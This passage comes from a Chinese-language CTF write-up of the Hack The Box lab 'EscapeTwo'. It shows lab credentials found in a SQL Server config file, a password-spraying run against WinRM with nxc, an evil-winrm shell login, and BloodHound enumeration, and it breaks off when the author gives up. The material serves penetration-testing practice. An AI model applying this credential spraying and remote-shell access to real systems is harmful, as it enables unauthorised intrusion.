SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
PS C:\sql2019\ExpressAdv_ENU> 
```

把它加到我的小本本里面继续狠狠喷洒密码

## Own User

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ nxc winrm 10.10.11.51 -u rids -p passwd.list --continue-on-success
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Enterprise Read-only Domain Controllers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Domain Admins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Domain Users:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Domain Guests:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Domain Computers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Domain Controllers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Cert Publishers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Schema Admins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Enterprise Admins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Group Policy Creator Owners:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Read-only Domain Controllers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Cloneable Domain Controllers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Protected Users:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Key Admins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Enterprise Key Admins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\RAS and IAS Servers:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Allowed RODC Password Replication Group:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Denied RODC Password Replication Group:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\DC01$:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\DnsAdmins:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\DnsUpdateProxy:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\SQLServer2005SQLBrowserUser$DC01:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\SQLRUserGroupSQLEXPRESS:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Management Department:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Sales Department:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Accounting Department:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Reception Department:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\Human Resources Department:WqSZAF6CysDQbGb3
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3
```

evil-winrm登录

```powershell
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

传个狗上去看看域关系

```bash
┌──(kali㉿kali)-[~/HTB/Escapetwo]
└─$ bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 26S
```

------

ok剩下的就不会了，又是看不懂域渗透的一集。菜就多练，我直接回去多练。等我学会狗图怎么看了我再回来！

从mane的blog学到了weevely这个shell管理器，看着好方便的样子，明天学学去。┗|｀O′|┛ 嗷~~，好像已经到明天了的样子qaq。睡觉！

------

mane的blog好像是自己写的呢，我也想要有自己的写的blog
